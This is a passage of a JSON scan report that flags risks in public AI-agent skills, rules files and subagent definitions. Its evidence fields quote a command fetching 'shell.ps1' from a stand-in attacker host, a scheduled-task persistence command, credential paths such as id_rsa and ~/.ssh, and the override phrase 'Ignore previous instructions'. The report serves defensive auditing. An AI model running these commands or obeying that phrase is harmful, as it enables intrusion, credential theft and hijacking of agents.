+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 331,
+          "evidence": "id_rsa"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 233,
+          "evidence": "http://192.168.1.1"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 236,
+          "evidence": "http://192.168.1.1"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 239,
+          "evidence": "http://192.168.1.1"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 242,
+          "evidence": "http://192.168.1.1"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 243,
+          "evidence": "http://192.168.1.1"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/privilege-escalation-methods/skill.md#privilege-escalation-methods",
+      "name": "Privilege Escalation Methods",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/privilege-escalation-methods/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/privilege-escalation-methods/SKILL.md",
+      "level": "low",
+      "score": 7,
+      "counts": {
+        "medium": 1,
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 76,
+          "evidence": "id_rsa"
+        },
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 203,
+          "evidence": "schtasks /create"
+        },
+        {
+          "id": "external-script-fetch",
+          "severity": "low",
+          "title": {
+            "zh": "下载外部脚本",
+            "en": "Downloads external script"
+          },
+          "where": "body",
+          "line": 204,
+          "evidence": "iwr http://attacker/shell.ps1"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/shodan-reconnaissance/skill.md#shodan-reconnaissance-and-pentesting",
+      "name": "Shodan Reconnaissance and Pentesting",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/shodan-reconnaissance/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/shodan-reconnaissance/SKILL.md",
+      "level": "low",
+      "score": 7,
+      "counts": {
+        "medium": 3
+      },
+      "flags": [
+        {
+          "id": "secret-in-url",
+          "severity": "medium",
+          "title": {
+            "zh": "密钥被拼进 URL",
+            "en": "Secret interpolated into URL"
+          },
+          "where": "body",
+          "line": 259,
+          "evidence": "https://api.shodan.io/api-info?key=YOUR_KEY"
+        },
+        {
+          "id": "secret-in-url",
+          "severity": "medium",
+          "title": {
+            "zh": "密钥被拼进 URL",
+            "en": "Secret interpolated into URL"
+          },
+          "where": "body",
+          "line": 262,
+          "evidence": "https://api.shodan.io/shodan/host/1.1.1.1?key=YOUR_KEY"
+        },
+        {
+          "id": "secret-in-url",
+          "severity": "medium",
+          "title": {
+            "zh": "密钥被拼进 URL",
+            "en": "Secret interpolated into URL"
+          },
+          "where": "body",
+          "line": 265,
+          "evidence": "https://api.shodan.io/shodan/host/search?key=YOUR_KEY&query=apache"
+        }
+      ]
+    },
+    {
+      "id": "skill:composiohq/awesome-claude-skills:slack-gif-creator/skill.md#slack-gif-creator",
+      "name": "slack-gif-creator",
+      "type": "skill",
+      "repo": "ComposioHQ/awesome-claude-skills",
+      "path": "slack-gif-creator/SKILL.md",
+      "url": "https://github.com/ComposioHQ/awesome-claude-skills/blob/HEAD/slack-gif-creator/SKILL.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "contact-solicitation",
+          "severity": "low",
+          "title": {
+            "zh": "导流联系方式",
+            "en": "Contact solicitation"
+          },
+          "where": "script",
+          "line": 19,
+          "evidence": "vx:"
+        }
+      ]
+    },
+    {
+      "id": "skill:composiohq/awesome-claude-skills:connect-apps/skill.md#connect-apps",
+      "name": "connect-apps",
+      "type": "skill",
+      "repo": "ComposioHQ/awesome-claude-skills",
+      "path": "connect-apps/SKILL.md",
+      "url": "https://github.com/ComposioHQ/awesome-claude-skills/blob/HEAD/connect-apps/SKILL.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "promo-link",
+          "severity": "low",
+          "title": {
+            "zh": "推广/返利链接",
+            "en": "Promotional / affiliate link"
+          },
+          "where": "body",
+          "line": 21,
+          "evidence": "https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills))"
+        },
+        {
+          "id": "promo-link",
+          "severity": "low",
+          "title": {
+            "zh": "推广/返利链接",
+            "en": "Promotional / affiliate link"
+          },
+          "where": "body",
+          "line": 73,
+          "evidence": "https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills\">"
+        }
+      ]
+    },
+    {
+      "id": "skill:composiohq/awesome-claude-skills:connect/skill.md#connect",
+      "name": "connect",
+      "type": "skill",
+      "repo": "ComposioHQ/awesome-claude-skills",
+      "path": "connect/SKILL.md",
+      "url": "https://github.com/ComposioHQ/awesome-claude-skills/blob/HEAD/connect/SKILL.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "promo-link",
+          "severity": "low",
+          "title": {
+            "zh": "推广/返利链接",
+            "en": "Promotional / affiliate link"
+          },
+          "where": "body",
+          "line": 41,
+          "evidence": "https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills)"
+        },
+        {
+          "id": "promo-link",
+          "severity": "low",
+          "title": {
+            "zh": "推广/返利链接",
+            "en": "Promotional / affiliate link"
+          },
+          "where": "body",
+          "line": 149,
+          "evidence": "https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills\">"
+        }
+      ]
+    },
+    {
+      "id": "skill:composiohq/awesome-claude-skills:langsmith-fetch/skill.md#langsmith-fetch",
+      "name": "langsmith-fetch",
+      "type": "skill",
+      "repo": "ComposioHQ/awesome-claude-skills",
+      "path": "langsmith-fetch/SKILL.md",
+      "url": "https://github.com/ComposioHQ/awesome-claude-skills/blob/HEAD/langsmith-fetch/SKILL.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 389,
+          "evidence": ">> ~/.bashrc"
+        },
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 390,
+          "evidence": ">> ~/.bashrc"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:.claude-plugin/skills/owasp-security/skill.md#owasp-security",
+      "name": "owasp-security",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude-plugin/skills/owasp-security/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude-plugin/skills/owasp-security/SKILL.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "instruction-override",
+          "severity": "medium",
+          "title": {
+            "zh": "覆盖既有指令",
+            "en": "Instruction override"
+          },
+          "where": "body",
+          "line": 705,
+          "evidence": "Ignore previous instructions"
+        },
+        {
+          "id": "instruction-override",
+          "severity": "medium",
+          "title": {
+            "zh": "覆盖既有指令",
+            "en": "Instruction override"
+          },
+          "where": "body",
+          "line": 715,
+          "evidence": "Ignore previous instructions"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/ai-research/loki-mode/skill.md#loki-mode",
+      "name": "loki-mode",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/ai-research/loki-mode/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/ai-research/loki-mode/SKILL.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "medium",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "script",
+          "line": 114,
+          "evidence": "http://127.0.0.1:57374/dashboard/index.html\""
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/creative-design/executing-marketing-campaigns/skill.md#executing-marketing-campaigns",
+      "name": "executing-marketing-campaigns",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/creative-design/executing-marketing-campaigns/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/creative-design/executing-marketing-campaigns/SKILL.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "promo-link",
+          "severity": "low",
+          "title": {
+            "zh": "推广/返利链接",
+            "en": "Promotional / affiliate link"
+          },
+          "where": "script",
+          "line": 13,
+          "evidence": "https://example.com?utm_source=email&utm_campaign=Q3\""
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/pocketbase/pb-sdk/skill.md#pocketbase-sdk",
+      "name": "PocketBase SDK",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/pocketbase/pb-sdk/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/pocketbase/pb-sdk/SKILL.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 17,
+          "evidence": "http://127.0.0.1:8090')"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 425,
+          "evidence": "http://127.0.0.1:8090')"
+        }
+      ]
+    },
+    {
+      "id": "rules:davila7/claude-code-templates:cli-tool/components/skills/database/supabase-postgres-best-practices/agents.md#agents",
+      "name": "AGENTS",
+      "type": "rules",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/database/supabase-postgres-best-practices/AGENTS.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/database/supabase-postgres-best-practices/AGENTS.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 451,
+          "evidence": "drop table"
+        },
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 719,
+          "evidence": "drop table"
+        }
+      ]
+    },
+    {
+      "id": "rules:davila7/claude-code-templates:cli-tool/components/skills/development/postgres-best-practices/agents.md#agents",
+      "name": "AGENTS",
+      "type": "rules",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/development/postgres-best-practices/AGENTS.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/development/postgres-best-practices/AGENTS.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 451,
+          "evidence": "drop table"
+        },
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 719,
+          "evidence": "drop table"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/google-maps-js.mdc#google-maps-js",
+      "name": "google-maps-js",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/google-maps-js.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/google-maps-js.mdc",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "secret-in-url",
+          "severity": "medium",
+          "title": {
+            "zh": "密钥被拼进 URL",
+            "en": "Secret interpolated into URL"
+          },
+          "where": "body",
+          "line": 125,
+          "evidence": "https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap"
+        },
+        {
+          "id": "secret-in-url",
+          "severity": "medium",
+          "title": {
+            "zh": "密钥被拼进 URL",
+            "en": "Secret interpolated into URL"
+          },
+          "where": "body",
+          "line": 298,
+          "evidence": "https://maps.googleapis.com/maps/api/geocode/json?address=${encodedAddress}&key=${process.env.GOOGLE_MAPS_SERVER_API_KEY}"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/postgre-database-reviewer.md#database-reviewer",
+      "name": "database-reviewer",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/postgre-database-reviewer.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/postgre-database-reviewer.md",
+      "level": "low",
+      "score": 6,
+      "counts": {
+        "low": 1,
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 257,
+          "evidence": "DROP TABLE"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/ai-research/mlops-mlflow/skill.md#mlflow",
+      "name": "mlflow",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/ai-research/mlops-mlflow/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/ai-research/mlops-mlflow/SKILL.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 642,
+          "evidence": "http://127.0.0.1:5001/invocations"
+        }
+      ]
+    },
+    {
+      "id": "command:davila7/claude-code-templates:.claude/commands/create-blog-article.md#create-blog-article",
+      "name": "create-blog-article",
+      "type": "command",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude/commands/create-blog-article.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude/commands/create-blog-article.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "promo-link",
+          "severity": "low",
+          "title": {
+            "zh": "推广/返利链接",
+            "en": "Promotional / affiliate link"
+          },
+          "where": "body",
+          "line": 293,
+          "evidence": "https://code.claude.com/docs/en/[appropriate-doc-page]?utm_source=aitmpl&utm_medium=referral&utm_campaign=blog\""
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/database/database-migration/skill.md#database-migration",
+      "name": "database-migration",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/database/database-migration/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/database/database-migration/SKILL.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 320,
+          "evidence": "DROP TABLE"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/ethical-hacking-methodology/skill.md#ethical-hacking-methodology",
+      "name": "Ethical Hacking Methodology",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/ethical-hacking-methodology/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/ethical-hacking-methodology/SKILL.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 275,
+          "evidence": "~/.ssh"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/html-injection-testing/skill.md#html-injection-testing",
+      "name": "HTML Injection Testing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/html-injection-testing/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/html-injection-testing/SKILL.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 105,
+          "evidence": "白色隐藏文本样式:color:white"
+        }
+      ]
+    },
+    {
+      "id": "subagent:davila7/claude-code-templates:.claude/agents/blog-writer.md#blog-writer",
+      "name": "blog-writer",
+      "type": "subagent",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude/agents/blog-writer.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude/agents/blog-writer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:davila7/claude-code-templates:.claude/agents/component-reviewer.md#component-reviewer",
+      "name": "component-reviewer",
+      "type": "subagent",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude/agents/component-reviewer.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude/agents/component-reviewer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "rules:patrickjs/awesome-cursorrules:rules/nestjs-anti-hallucination-cursorrules-prompt-file.mdc#nestjs-anti-hallucination-cursorrules-prompt-file",
+      "name": "nestjs-anti-hallucination-cursorrules-prompt-file",
+      "type": "rules",
+      "repo": "PatrickJS/awesome-cursorrules",
+      "path": "rules/nestjs-anti-hallucination-cursorrules-prompt-file.mdc",
+      "url": "https://github.com/PatrickJS/awesome-cursorrules/blob/HEAD/rules/nestjs-anti-hallucination-cursorrules-prompt-file.mdc",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 237,
+          "evidence": "DROP TABLE"
+        }
+      ]
+    },
+    {
+      "id": "skill:dontbesilent2025/dbskill:skills/dbs-good-question/skill.md#dbs-good-question",
+      "name": "dbs-good-question",
+      "type": "skill",
+      "repo": "dontbesilent2025/dbskill",
+      "path": "skills/dbs-good-question/SKILL.md",
+      "url": "https://github.com/dontbesilent2025/dbskill/blob/HEAD/skills/dbs-good-question/SKILL.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "contact-solicitation",
+          "severity": "low",
+          "title": {
+            "zh": "导流联系方式",
+            "en": "Contact solicitation"
+          },
+          "where": "body",
+          "line": 405,
+          "evidence": "加微信"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/aws-rds.mdc#aws-rds",
+      "name": "aws-rds",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/aws-rds.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/aws-rds.mdc",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 167,
+          "evidence": "DROP TABLE"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/peewee.mdc#peewee",
+      "name": "peewee",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/peewee.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/peewee.mdc",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "sql-destructive",
+          "severity": "low",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 269,
+          "evidence": "DROP TABLE"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/phoenix.mdc#phoenix",
+      "name": "phoenix",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/phoenix.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/phoenix.mdc",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 243,
+          "evidence": "> put_assoc(:profile, profile_changeset(user.profile"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/code-reviewer.md#code-reviewer",
+      "name": "code-reviewer",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/code-reviewer.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/code-reviewer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/database-reviewer.md#database-reviewer",
+      "name": "database-reviewer",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/database-reviewer.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/database-reviewer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/python-reviewer.md#python-reviewer",
+      "name": "python-reviewer",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/python-reviewer.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/python-reviewer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/refactor-cleaner.md#refactor-cleaner",
+      "name": "refactor-cleaner",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/refactor-cleaner.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/refactor-cleaner.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/security-reviewer.md#security-reviewer",
+      "name": "security-reviewer",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/security-reviewer.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/security-reviewer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:joneqian/claude-skills-suite:skills/deepagents/skill.md#deepagents",
+      "name": "deepagents",
+      "type": "skill",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "skills/deepagents/SKILL.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/skills/deepagents/SKILL.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "low",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 19,
+          "evidence": "存在零宽字符(常见于文档站抓取残留,需人工确认)"
+        }
+      ]
+    },
+    {
+      "id": "rules:nedcodes-ok/cursorrules-collection:rules-mdc/practices/security.mdc#security",
+      "name": "security",
+      "type": "rules",
+      "repo": "nedcodes-ok/cursorrules-collection",
+      "path": "rules-mdc/practices/security.mdc",
+      "url": "https://github.com/nedcodes-ok/cursorrules-collection/blob/HEAD/rules-mdc/practices/security.mdc",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "sql-destructive",
+          "severity": "medium",
+          "title": {
+            "zh": "SQL 破坏性语句",
+            "en": "Destructive SQL statement"
+          },
+          "where": "body",
+          "line": 23,
+          "evidence": "DROP TABLE"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/code-reviewer.md#code-reviewer",
+      "name": "code-reviewer",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/code-reviewer.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/code-reviewer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/mysql-database-reviewer.md#mysql-database-reviewer",
+      "name": "mysql-database-reviewer",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/mysql-database-reviewer.md",
